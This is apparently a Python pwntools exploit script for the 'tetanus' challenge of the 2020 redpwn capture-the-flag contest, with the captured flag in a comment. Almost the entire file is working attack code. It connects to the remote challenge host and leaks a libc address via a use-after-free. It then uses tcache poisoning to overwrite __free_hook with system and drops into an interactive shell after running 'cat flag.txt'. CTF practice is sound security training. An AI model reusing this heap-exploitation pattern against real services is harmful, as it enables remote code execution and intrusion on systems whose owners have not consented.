#exploit for tetanus
#flag=flag{w0w_wh0da_thunk_th4t_unsafe_means_unsafe_ls!}
from pwn import *
target=remote('2020.redpwnc.tf',31069)
libc=ELF('./libc6_2.30-0ubuntu2_amd64.so')

def init(option):
	print(target.recvuntil("> "))
	target.sendline(str(option))
	print(target.recvuntil("> "))
	
def create(size):
	init(1)
	target.sendline(str(size))

def delete(index):
	init(2)
	target.sendline(str(index))

def edit(index,element,data):
	init(3)
	target.sendline(str(index))
	print(target.recvuntil("> "))
	target.sendline(str(element))
	print(target.recvuntil("> "))
	target.sendline(str(data))

def view(index,element):
	init(6)
	target.sendline(str(index))
	print(target.recvuntil("> "))
	target.sendline(str(element))
	print(target.recvuntil("Value: "))
	leak=int(target.recvline().strip("\n"))
	print(hex(leak))
	return int(hex(leak),16)

def append(index,n,data):
	init(5)
	target.sendline(str(index))
	print(target.recvuntil("> "))
	target.sendline(str(n))
	for i in range(n):
		print(target.recvline())
		target.sendline(str(data[i]))

	
create(0x100)
for i in range(3):
	create(0x10)
for i in range(4):
	append(i,2,[0x3a6873,0x3a6873])
delete(0)
libc_leak=view(0,0)
libc_base=libc_leak-libc.symbols["__malloc_hook"]-0x70
libc_free_hook=libc_base+libc.symbols["__free_hook"]
libc_system=libc_base+libc.symbols["system"]
delete(1)
delete(2)
edit(2,0,libc_free_hook)
create(0x10)
create(0x10)
append(4,2,[0x3a6873,0x3a6873])
append(5,1,[libc_system])
target.sendline("cat flag.txt")

target.interactive()


